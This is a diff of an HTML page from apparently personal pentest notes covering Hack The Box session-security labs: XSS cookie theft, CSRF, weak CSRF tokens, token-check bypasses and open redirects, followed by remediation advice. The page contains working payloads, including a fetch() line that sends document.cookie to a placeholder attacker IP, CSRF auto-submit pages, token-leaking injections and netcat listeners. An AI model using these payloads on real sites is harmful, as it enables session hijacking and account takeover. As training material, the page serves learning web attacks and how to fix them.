+<p>Simulating the victim and navigating to the shared profile of Ela, brings you the cookie when the victim hovers over “test”:</p>
 <pre><code class="language-bash">┌──(d41y㉿user)-[~/ctf/htb/vpns]
 └─$ nc -lnvp 8000        
 Listening on 0.0.0.0 8000
@@ -662,19 +671,19 @@ Connection: keep-alive
 Referer: http://xss.htb.net/
 Priority: u=4, i
 </code></pre>
-<p>You can no hijack the victim's session.</p>
-<blockquote>
-<p>[!TIP]
-You don't necessarily have to use the <code>window.location()</code> object that causes the victim to get redirected. You can use <code>fetch()</code>, which can fetch data and send it to your server without any redirects. This is a stealthier way.<br>
+<p>You can no hijack the victim’s session.</p>
+<blockquote class="blockquote-tag blockquote-tag-tip">
+<p class="blockquote-tag-title"><svg viewbox="0 0 16 16" width="18" height="18"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p>
+<p>You don’t necessarily have to use the <code>window.location()</code> object that causes the victim to get redirected. You can use <code>fetch()</code>, which can fetch data and send it to your server without any redirects. This is a stealthier way.<br>
 Example:<br>
 <code>&lt;script&gt;fetch(`http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=${btoa(document.cookie)}`)&lt;/script&gt;</code></p>
 </blockquote>
 <h3 id="csrf"><a class="header" href="#csrf">CSRF</a></h3>
-<p>... is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf.</p>
+<p>… is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim’s behalf.</p>
 <p>A web app is vulnerable to CSRF when:</p>
 <ul>
 <li>all the parameters required for the targeted request can be determined or guessed by the attacker</li>
-<li>the application's session management is solely based on HTTP cookies, which are automatically included in browser request</li>
+<li>the application’s session management is solely based on HTTP cookies, which are automatically included in browser request</li>
 </ul>
 <p>To successfully exploit CSRF, you need:</p>
 <ul>
@@ -684,7 +693,7 @@ Example:<br>
 <h4 id="example-3"><a class="header" href="#example-3">Example</a></h4>
 <p>Log in with given credentials, activate Burpsuite and change the contact info.</p>
 <p>Interception with Burp:</p>
-<p><img src="../../../images/session_security_csrf1.png" alt="csrf 1" /></p>
+<p><img src="../../../images/session_security_csrf1.png" alt="csrf 1"></p>
 <p>You notice no anti-CSRF token in the update-profile request. Now try executing a CSRF attack that will change her profile details by simply visiting another website.</p>
 <p>Create and serve the below HTML:</p>
 <pre><code class="language-html">&lt;html&gt;
@@ -701,21 +710,21 @@ Example:<br>
   &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-<p>... and:</p>
+<p>… and:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ python -m http.server 1337
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 </code></pre>
 <p>Open a new tab and visit the page you are serving from your attacking machine:</p>
-<p><img src="../../../images/session_security_csrf2.png" alt="csrf 2" /></p>
+<p><img src="../../../images/session_security_csrf2.png" alt="csrf 2"></p>
 <h3 id="csrf---get-based"><a class="header" href="#csrf---get-based">CSRF - GET-based</a></h3>
 <p>Similar to how you can extract session cookies from applications that do not utilize SSL encryption, you can do the same regarding CSRF tokens included in unencrypted requests.</p>
 <h4 id="example-4"><a class="header" href="#example-4">Example</a></h4>
-<p>Log on with given credentials. Browse to the profile and click "Save".</p>
-<p><img src="../../../images/session_security_csrf3.png" alt="csrf 3" /></p>
-<p>Activate Burp and click "Save" again.</p>
-<p><img src="../../../images/session_security_csrf4.png" alt="csrf 4" /></p>
+<p>Log on with given credentials. Browse to the profile and click “Save”.</p>
+<p><img src="../../../images/session_security_csrf3.png" alt="csrf 3"></p>
+<p>Activate Burp and click “Save” again.</p>
+<p><img src="../../../images/session_security_csrf4.png" alt="csrf 4"></p>
 <p>The CSRF token is included in the GET request.</p>
-<p>Now simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack.</p>
+<p>Now simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers’ profile through a CSRF attack.</p>
 <p>First, create and serve the below HTML:</p>
 <pre><code class="language-html">&lt;html&gt;
   &lt;body&gt;
@@ -733,22 +742,22 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
   &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-<p>... and:</p>
+<p>… and:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ python -m http.server 1337
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 </code></pre>
 <p>Open a new tab and visit the page you are serving from your attacking machine.</p>
-<p><img src="../../../images/session_security_csrf5.png" alt="csrf 5" /></p>
+<p><img src="../../../images/session_security_csrf5.png" alt="csrf 5"></p>
 <h3 id="csrf---post-based"><a class="header" href="#csrf---post-based">CSRF - POST-based</a></h3>
 <h4 id="example-5"><a class="header" href="#example-5">Example</a></h4>
-<p>Log in with the given credentials and click on "Delete". You will get redirected to <code>/app/delete/&lt;your-email&gt;</code>.</p>
-<p><img src="../../../images/session_security_csrf6.png" alt="csrf 6" /></p>
+<p>Log in with the given credentials and click on “Delete”. You will get redirected to <code>/app/delete/&lt;your-email&gt;</code>.</p>
+<p><img src="../../../images/session_security_csrf6.png" alt="csrf 6"></p>
 <p>Notice that the email is reflected on the page. Try inputting some HTML into the email value, such as:</p>
 <pre><code class="language-html">&lt;h1&gt;h1&lt;u&gt;underline&lt;%2fu&gt;&lt;%2fh1&gt;
 </code></pre>
-<p><img src="../../../images/session_security_csrf7.png" alt="csrf 7" /></p>
+<p><img src="../../../images/session_security_csrf7.png" alt="csrf 7"></p>
 <p>If you inspect the source, you will notice that your injection happens before a <code>'</code>. You can abuse this to leak the CSRF token.</p>
-<p><img src="../../../images/session_security_csrf8.png" alt="csrf 8" /></p>
+<p><img src="../../../images/session_security_csrf8.png" alt="csrf 8"></p>
 <p>First, instruct Netcat to listen on port 8000:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ nc -nlvp 8000
 listening on [any] 8000 ...
@@ -757,15 +766,15 @@ listening on [any] 8000 ...
 <pre><code class="language-html">&lt;table%20background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:PORT%2f
 </code></pre>
 <p>While still logged in as Julie Rogers, open a new tab and visit the <code>http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:8000%2f</code>. You will notice a connection being made that leaks the CSRF token.</p>
-<p><img src="../../../images/session_security_csrf9.png" alt="csrf 9" /></p>
+<p><img src="../../../images/session_security_csrf9.png" alt="csrf 9"></p>
 <h3 id="xss--csrf-chaining"><a class="header" href="#xss--csrf-chaining">XSS &amp; CSRF Chaining</a></h3>
 <h4 id="example-6"><a class="header" href="#example-6">Example</a></h4>
-<p>Log in with the given credentials, activate Burp and click "Make Public!".</p>
-<p><img src="../../../images/session_security_csrf10.png" alt="csrf 10" /></p>
-<p>... leads to:</p>
-<p><img src="../../../images/session_security_csrf11.png" alt="csrf 11" /></p>
-<p>Forward all requests so that Ela Stienen's profile becomes public.</p>
-<p>The payload you need to specify in the <em>Country Field</em> of Ela Stienen's profile to successfully execute CSRF:</p>
+<p>Log in with the given credentials, activate Burp and click “Make Public!”.</p>
+<p><img src="../../../images/session_security_csrf10.png" alt="csrf 10"></p>
+<p>… leads to:</p>
+<p><img src="../../../images/session_security_csrf11.png" alt="csrf 11"></p>
+<p>Forward all requests so that Ela Stienen’s profile becomes public.</p>
+<p>The payload you need to specify in the <em>Country Field</em> of Ela Stienen’s profile to successfully execute CSRF:</p>
 <pre><code class="language-javascript">&lt;script&gt;
 // part1: creates an ObjectVariable called req, which you will be using to generate a request
 var req = new XMLHttpRequest();
@@ -793,22 +802,22 @@ function handleResponse(d) {
 // part2
 &lt;/script&gt;
 </code></pre>
-<p>Now, try to make the victim's profile public.</p>
-<p>First, submit the full payload to the <em>Country Field</em> of Ela Stienen's profile and click "Save".</p>
-<p><img src="../../../images/session_security_csrf12.png" alt="csrf 12" /></p>
+<p>Now, try to make the victim’s profile public.</p>
+<p>First, submit the full payload to the <em>Country Field</em> of Ela Stienen’s profile and click “Save”.</p>
+<p><img src="../../../images/session_security_csrf12.png" alt="csrf 12"></p>
 <p>Open a new private window, navigate to the website again, and log in using different credentials.</p>
-<p>This user has its profile "private". No "Share" functionality exists.</p>
-<p><img src="../../../images/session_security_csrf13.png" alt="csrf 13" /></p>
-<p>Open a new tab and browse Ela Stienen's public profile by navigating to <code>http://minilab.htb.net/profile?email=ela.stienen@example.com</code>.</p>
-<p>Now, if you go back to the victim's usual profile page and refresh/reload the page, you should see that his profile became "public".</p>
-<p><img src="../../../images/session_security_csrf14.png" alt="csrf 14" /></p>
+<p>This user has its profile “private”. No “Share” functionality exists.</p>
+<p><img src="../../../images/session_security_csrf13.png" alt="csrf 13"></p>
+<p>Open a new tab and browse Ela Stienen’s public profile by navigating to <code>http://minilab.htb.net/profile?email=ela.stienen@example.com</code>.</p>
+<p>Now, if you go back to the victim’s usual profile page and refresh/reload the page, you should see that his profile became “public”.</p>
+<p><img src="../../../images/session_security_csrf14.png" alt="csrf 14"></p>
 <p>You just executed a CSRF-attack through XSS, bypassing the <em>same origin/same site</em> protections in place.</p>
 <h3 id="exploiting-weak-csrf-tokens"><a class="header" href="#exploiting-weak-csrf-tokens">Exploiting Weak CSRF Tokens</a></h3>
 <p>Often, web apps do not employ very secure or robust token generation algorithms.</p>
 <h4 id="example-7"><a class="header" href="#example-7">Example</a></h4>
 <p>Log in with the given credentials, open Web Developer Tools, initiate a request and note the value of the CSRF token.</p>
-<p><img src="../../../images/session_security_csrf15.png" alt="csrf 15" /></p>
-<p>Execute the below command to calculate the MD5 hash of the string "goldenpeacock467" (<em>the username</em>):</p>
+<p><img src="../../../images/session_security_csrf15.png" alt="csrf 15"></p>
+<p>Execute the below command to calculate the MD5 hash of the string “goldenpeacock467” (<em>the username</em>):</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ echo -n goldenpeacock467 | md5sum
 0bef12f8998057a7656043b6d30c90a2  -
 </code></pre>
@@ -860,9 +869,9 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 </code></pre>
 <p>Open a new private tab, and log in as a different user (<em>the victim</em>).</p>
 <p>While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine:</p>
-<p><img src="../../../images/session_security_csrf16.png" alt="csrf 16" /></p>
-<p>Now press "Start!". You notice that when Ela Stienen presses "Start!", her profile will become public.</p>
-<p><img src="../../../images/session_security_csrf17.png" alt="csrf 17" /></p>
+<p><img src="../../../images/session_security_csrf16.png" alt="csrf 16"></p>
+<p>Now press “Start!”. You notice that when Ela Stienen presses “Start!”, her profile will become public.</p>
+<p><img src="../../../images/session_security_csrf17.png" alt="csrf 17"></p>
 <h3 id="additional-csrf-protection-bypasses"><a class="header" href="#additional-csrf-protection-bypasses">Additional CSRF Protection Bypasses</a></h3>
 <h4 id="null-value"><a class="header" href="#null-value">Null Value</a></h4>
 <p>You can try making the CSRF token a null value:</p>
@@ -877,9 +886,9 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 <p>Fake:</p>
 <pre><code>CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3
 </code></pre>
-<h4 id="use-another-sessions-csrf-token"><a class="header" href="#use-another-sessions-csrf-token">Use Another Session's CSRF Token</a></h4>
+<h4 id="use-another-sessions-csrf-token"><a class="header" href="#use-another-sessions-csrf-token">Use Another Session’s CSRF Token</a></h4>
 <p>Using the same CSRF token across accounts. This may work in apps that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.</p>
-<p>Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, <code>CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331</code>.</p>
+<p>Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token’s value, for example, <code>CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331</code>.</p>
 <p>Log into the second account and change the value of CSRF token to <code>9cfffd9e8e78bd68975e295d1b3d3331</code> while issuing the same request. If the request is issued successfully, you can successfully execute CSRF attacks using a token generated through your account that is considered valid across multiple accounts.</p>
 <h4 id="request-method-tampering"><a class="header" href="#request-method-tampering">Request Method Tampering</a></h4>
 <p>Ty bypass anti-CSRF protections, you can try changing the request method from POST to GET and vice versa.</p>
@@ -888,23 +897,23 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 POST body:
 new_password=pwned&amp;confirm_new=pwned
 </code></pre>
-<p>... to:</p>
+<p>… to:</p>
 <pre><code>GET /change_password?new_password=pwned&amp;confirm_new=pwned
 </code></pre>
 <p>Unexpected requests may be served without the need for a CSRF token.</p>
 <h4 id="delete-the-csrf-token-parameter-or-send-a-blank-token"><a class="header" href="#delete-the-csrf-token-parameter-or-send-a-blank-token">Delete the CSRF Token Parameter or send a blank Token</a></h4>
-<p>Not sending a token works fairly often because of the following common application logic mistake. Apps sometimes only check the token's validity if the token exists or if the token is not blank.</p>
+<p>Not sending a token works fairly often because of the following common application logic mistake. Apps sometimes only check the token’s validity if the token exists or if the token is not blank.</p>
 <p>Real Request:</p>
 <pre><code>POST /change_password
 POST body:
 new_password=qwerty&amp;csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
 </code></pre>
-<p>... try:</p>
+<p>… try:</p>
 <pre><code>POST /change_password
 POST body:
 new_password=qwerty
 </code></pre>
-<p>... or:</p>
+<p>… or:</p>
 <pre><code>POST /change_password
 POST body:
 new_password=qwerty&amp;csrf_token=
@@ -932,7 +941,7 @@ new_password=pwned&amp;CSRF-Token=fixed_token
 <p>You can try some of the following as well:</p>
 <p><code>www.pwned.m3?www.target.com</code> or <code>www.pwned.m3/www.target.com</code>.</p>
 <h3 id="open-redirect"><a class="header" href="#open-redirect">Open Redirect</a></h3>
-<p>... vuln occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate app's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim.</p>
+<p>… vuln occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate app’s redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim.</p>
 <p>Take a look:</p>
 <pre><code class="language-php">$red = $_GET['url'];
 header("Location: " . $red);
@@ -944,7 +953,7 @@ header("Location: " . $red);
 </code></pre>
 <h4 id="example-8"><a class="header" href="#example-8">Example</a></h4>
 <p>If you enter an email account, you will notice that the application is eventually making a POST request to the page specified in the <code>redirect_uri</code> parameter. A <code>token</code> is also included in the POST request. This token could be a session or anti-CSRF token, and therefore, useful to an attacker.</p>
-<p><img src="../../../images/session_security_redirect1.png" alt="session security redirect 1" /></p>
+<p><img src="../../../images/session_security_redirect1.png" alt="session security redirect 1"></p>
 <p>Now, test if you can control the site where the <code>redirect_uri</code> parameter points to. In other words, check if the app performs the redirection without any kind of validation.</p>
 <p>Set up a Netcat listener.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ nc -lvnp 1337
@@ -952,18 +961,18 @@ header("Location: " . $red);
 <p>Change the url from:</p>
 <pre><code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;
 </code></pre>
-<p>... to:</p>
+<p>… to:</p>
 <pre><code>http://oredirect.htb.net/?redirect_uri=http://&lt;VPN/TUN Adapter IP&gt;:PORT&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;
 </code></pre>
 <p>Open a new private window and navigate to the link.</p>
 <p>When the victim enters their email, you will notice a connection being made to your listener.</p>
-<p><img src="../../../images/session_security_redirect2.png" alt="session security redirect 2" /></p>
+<p><img src="../../../images/session_security_redirect2.png" alt="session security redirect 2"></p>
 <p>Open redirect vulns are usually exploited by attacker to create legitimate-looking phishing URLs. When a redirection functionality involves user tokens, attackers can also exploit open redirect vulns to obtain user tokens.</p>
 <h2 id="remediation-advice"><a class="header" href="#remediation-advice">Remediation Advice</a></h2>
 <h3 id="session-hijacking-1"><a class="header" href="#session-hijacking-1">Session Hijacking</a></h3>
 <p>User session monitoring/anomaly detection solutions can detect session hijacking. It is a safer bet to counter session hijacking by trying to eliminate all vulns mentioned above.</p>
 <h3 id="session-fixation-1"><a class="header" href="#session-fixation-1">Session Fixation</a></h3>
-<p>... can be remediated by generating a new session identifier upon an authenticated operation. Simply invalidating any pre-login session identifier and generating a new one post-login should be enough.</p>
+<p>… can be remediated by generating a new session identifier upon an authenticated operation. Simply invalidating any pre-login session identifier and generating a new one post-login should be enough.</p>
 <h4 id="examples"><a class="header" href="#examples">Examples</a></h4>
 <h5 id="php-1"><a class="header" href="#php-1">PHP</a></h5>
 <pre><code class="language-php">session_regenerate_id(bool $delete_old_session = false): bool
@@ -981,15 +990,15 @@ session = request.getSession(true);
 Session.Abandon();
 ...
 </code></pre>
-<p>For session invalidation purposes, the .NET framework utilizes <code>Session.Abandon();</code>, but there is a caveat. <code>Session.Abandon();</code> is not sufficient for this task. Microsoft: "When you abandon a session, the session ID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same session ID but will have a new session state instance." So, to address session fixation holistically, one needs to utilize <code>Session.Abandon();</code> and overwrite the cookie header or implement more complex cookie-based session management by enriching the information held within and cookie and performing server-side checks.</p>
+<p>For session invalidation purposes, the .NET framework utilizes <code>Session.Abandon();</code>, but there is a caveat. <code>Session.Abandon();</code> is not sufficient for this task. Microsoft: “When you abandon a session, the session ID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same session ID but will have a new session state instance.” So, to address session fixation holistically, one needs to utilize <code>Session.Abandon();</code> and overwrite the cookie header or implement more complex cookie-based session management by enriching the information held within and cookie and performing server-side checks.</p>
 <h3 id="xss-1"><a class="header" href="#xss-1">XSS</a></h3>
 <h4 id="validation-of-user-input"><a class="header" href="#validation-of-user-input">Validation of User Input</a></h4>
 <p>The app should validate every input received immediately upon receiving it. Input validation should be performed on the server-side, using a positive approach (<em>limit the permitted input chars to chars that appear in a whitelist</em>), instead of a negative approach (<em>preventing the usage of chars that appear in a blacklist</em>), since the positive approach helps the programmer avoid potential flaws that result from mishandling potentially malicious chars. Input validation implementation must include the following validation principles in the following order:</p>
 <ul>
 <li>verify the existence of actual input, do not accept null or empty values when the input is not optional</li>
-<li>enforce input size restriction; make sure the input's length is within the expected range</li>
+<li>enforce input size restriction; make sure the input’s length is within the expected range</li>
 <li>validate the input type, make sure the data received is, in fact, the type expected</li>
-<li>restrict the input range of values; the input's value should be within the acceptable range of values for the input's role in the application</li>
+<li>restrict the input range of values; the input’s value should be within the acceptable range of values for the input’s role in the application</li>
 <li>sanitize special chars, unless there is a unique functional needed, the input char set should be limited to azAZ09</li>
 <li>ensure logical input compliance</li>
 </ul>
@@ -1006,7 +1015,7 @@ Session.Abandon();
 <li>session values originated directly from user input or user-controlled data repository values</li>
 <li>values received from external entities</li>
 <li>any other value which could have been affected by the user</li>
-<li>the encoding process should verify that input matching the given criteria will be processed through a data sanitization component, which will replace non-alphanumerical chars in their HTML representation before including these values in the output sent to the user or the log file; this operation ensures that every script will be presented to the user rather than executed in the user's browser</li>
+<li>the encoding process should verify that input matching the given criteria will be processed through a data sanitization component, which will replace non-alphanumerical chars in their HTML representation before including these values in the output sent to the user or the log file; this operation ensures that every script will be presented to the user rather than executed in the user’s browser</li>
 </ul>
 <h4 id="additional-instructions"><a class="header" href="#additional-instructions">Additional Instructions</a></h4>
 <ul>
@@ -1014,9 +1023,9 @@ Session.Abandon();
 <li>complimentary instructions for protecting the application against cross-site scripting can be found <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">here</a></li>
 <li>a list of HTML encoded chars representations can be found <a href="https://www.degraeve.com/reference/specialcharacters.php">here</a></li>
 </ul>
-<blockquote>
-<p>[!TIP]
-Cookies should be marked as HTTPOnly for XSS attacks to not be able to capture them.</p>
+<blockquote class="blockquote-tag blockquote-tag-tip">
+<p class="blockquote-tag-title"><svg viewbox="0 0 16 16" width="18" height="18"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p>
+<p>Cookies should be marked as HTTPOnly for XSS attacks to not be able to capture them.</p>
 </blockquote>
 <h3 id="csrf-1"><a class="header" href="#csrf-1">CSRF</a></h3>
 <p>It is recommended that whenever a request is made to access each function, a check should be done to ensure the user is authenticated to perform that action.</p>
@@ -1035,20 +1044,19 @@ Cookies should be marked as HTTPOnly for XSS attacks to not be able to capture t
 <li>if user input cannot be avoided, ensure that the supplied value is valid, appropriate for the app, and is authorized for the user</li>
 <li>it is recommended that any destination input be mapped to a value rather than the actual URL or portion of the URL and that server-side code translates this value to the target URL</li>
 <li>sanitize input by creating a list of trusted URLs</li>
-<li>force all redirects to first go through a page notifying users that they are being redirected from your site and require them to click a link to confirm<!-- {% embed footer message="2026 • Created by [d41y](https://github.com/d41y)" %} --></li>
+<li>force all redirects to first go through a page notifying users that they are being redirected from your site and require them to click a link to confirm</li>
 </ul>
-<div data-embedify data-app="footer" data-option-message="2026 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
-<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2026 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
                             <a rel="prev" href="../../../attack/web/web_security_techniques/javascript_deobfuscation.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
-                                <i class="fa fa-angle-left"></i>
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                             </a>
 
                             <a rel="next prefetch" href="../../../attack/wifi/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                                <i class="fa fa-angle-right"></i>
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                             </a>
 
                         <div style="clear: both"></div>
@@ -1058,15 +1066,21 @@ Cookies should be marked as HTTPOnly for XSS attacks to not be able to capture t
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
                     <a rel="prev" href="../../../attack/web/web_security_techniques/javascript_deobfuscation.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
-                        <i class="fa fa-angle-left"></i>
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                     </a>
 
                     <a rel="next prefetch" href="../../../attack/wifi/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                        <i class="fa fa-angle-right"></i>
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                     </a>
             </nav>
 
         </div>
+
+        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
